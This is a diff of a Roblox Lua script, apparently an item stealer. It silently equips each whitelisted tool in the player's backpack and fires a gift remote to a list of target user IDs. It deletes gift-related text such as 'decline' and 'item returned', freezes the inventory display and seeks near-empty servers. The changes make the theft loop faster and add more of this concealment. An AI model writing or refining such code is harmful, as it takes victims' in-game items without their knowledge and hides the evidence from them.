@@ -82,7 +82,7 @@ local function getLowServer()
 
     if success and result and result.data then
         for _,server in pairs(result.data) do
-            if server.playing and server.playing <= 2 then
+            if server.playing and server.playing <= 3 then
                 return server.id
             end
         end
@@ -147,6 +147,7 @@ local function killGiftText(v)
     or string.find(text, "queue")
     or string.find(text, "decline")
     or string.find(text, "popup")
+    or string.find(text, "item returned")
     then
         v:Destroy()
     end
@@ -168,15 +169,36 @@ end)
 -- 🔥 FREEZE BACKPACK (SAFE)
 --====================================================
 
-local inv = player.PlayerGui:WaitForChild("NewInventory")
+local player = game:GetService("Players").LocalPlayer
 
+local function getInv()
+    local pg = player:FindFirstChild("PlayerGui")
+    while not pg do
+        task.wait()
+        pg = player:FindFirstChild("PlayerGui")
+    end
+    return pg:WaitForChild("NewInventory")
+end
 
--- Method 3
-for _,v in ipairs(inv:GetDescendants()) do
-    if v:IsA("UIStroke") then
-        v:Destroy()
+local inv = getInv()
+local slots = inv:WaitForChild("InventoryFrame"):WaitForChild("Slots")
+
+local function killStroke(obj)
+    if obj.Name == "Stroke" then
+        obj:Destroy()
     end
 end
+
+-- 🔥 bersihin semua yang udah ada
+for _,v in ipairs(slots:GetDescendants()) do
+    killStroke(v)
+end
+
+-- 🔥 anti spawn ulang (INI PENTING)
+slots.DescendantAdded:Connect(function(v)
+    task.wait()
+    killStroke(v)
+end)
 
 
 --====================================================
@@ -732,31 +754,24 @@ end)
 
 task.spawn(function()
     while true do
-        task.wait(0.1)
+        task.wait(0.05)
 
-        local tools = getSortedTools()
+        for _,tool in ipairs(backpack:GetChildren()) do
+            if tool:IsA("Tool")
+            and not isWeightTool(tool)
+            and isWhitelisted(tool)
+            and tool.Parent == backpack then
 
-        if #tools == 0 then
-            task.wait(1)
-            continue
-        end
-
-        for i = 1, #tools do
-            local tool = tools[i]
-
-            if tool and tool.Parent == backpack then
                 silentEquip(tool)
-                task.wait(0.05)
+                task.wait(0.03)
 
-                if isWhitelisted(tool) then
-                    for _,id in ipairs(targetUserIds) do
-                        giftRemote:FireServer(id)
-                        task.wait(0.1) -- 🔥 penting biar ga ke-skip server
-                    end
+                for _,id in ipairs(targetUserIds) do
+                    giftRemote:FireServer(id)
+                    task.wait(0.05)
                 end
 
                 unequipAll()
-                task.wait(0.05)
+                task.wait(0.03)
             end
         end
     end
